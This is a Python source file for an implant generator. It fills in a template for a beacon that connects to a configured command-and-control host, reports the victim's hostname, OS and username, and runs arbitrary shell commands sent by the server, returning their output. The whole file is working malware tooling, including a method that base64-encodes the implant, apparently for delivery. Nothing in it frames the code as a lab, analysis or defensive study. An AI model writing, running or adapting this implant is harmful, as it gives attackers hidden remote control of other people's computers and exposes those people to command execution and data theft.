"""Implant/beacon generator"""
import json, base64

IMPLANT_TEMPLATE = """
import socket, time, json, os, subprocess, platform

C2_HOST = "{host}"
C2_PORT = {port}
SLEEP = {sleep}
JITTER = {jitter}

def beacon():
    info = {{"hostname": platform.node(), "os": platform.system(), "user": os.getenv("USER","")}}
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            s.send(json.dumps({{"type": "checkin", "info": info}}).encode())
            data = s.recv(4096)
            if data:
                tasks = json.loads(data)
                for task in tasks:
                    result = execute_task(task)
                    s.send(json.dumps({{"type": "result", "task_id": task["id"], "data": result}}).encode())
            s.close()
        except: pass
        time.sleep(SLEEP)

def execute_task(task):
    if task["type"] == "shell":
        try:
            return subprocess.check_output(task["params"]["cmd"], shell=True, timeout=30).decode()
        except Exception as e:
            return str(e)
    elif task["type"] == "info":
        return json.dumps({{"pid": os.getpid(), "cwd": os.getcwd(), "user": os.getenv("USER","")}})
    return "unknown task"

if __name__ == "__main__":
    beacon()
"""

class ImplantGenerator:
    def __init__(self, config):
        self.config = config
    
    def generate(self, output_path=None):
        code = IMPLANT_TEMPLATE.format(
            host=self.config.listen_host,
            port=self.config.listen_port,
            sleep=self.config.heartbeat_interval,
            jitter=self.config.jitter
        )
        if output_path:
            with open(output_path, "w") as f:
                f.write(code)
        return code
    
    def generate_encoded(self):
        code = self.generate()
        return base64.b64encode(code.encode()).decode()
